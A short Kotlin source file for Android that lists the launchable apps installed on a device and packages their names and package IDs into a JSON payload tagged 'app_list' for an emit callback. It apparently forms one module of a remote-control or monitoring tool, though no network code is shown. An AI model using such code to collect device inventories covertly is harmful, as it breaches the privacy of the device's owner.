package com.app.cyber

import android.content.Context
import android.content.pm.PackageManager
import org.json.JSONArray
import org.json.JSONObject

object AppsRechive {
    fun listApps(ctx: Context, emit: (JSONObject) -> Unit) {
        val list = JSONArray()
        val pm = ctx.packageManager
        
        for (app in pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
            if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                val obj = JSONObject()
                obj.put("name", pm.getApplicationLabel(app).toString())
                obj.put("pkg", app.packageName)
                list.put(obj)
            }
        }
        
        val payload = JSONObject()
        payload.put("action", "app_list")
        payload.put("data", list)
        emit(payload)
    }
}
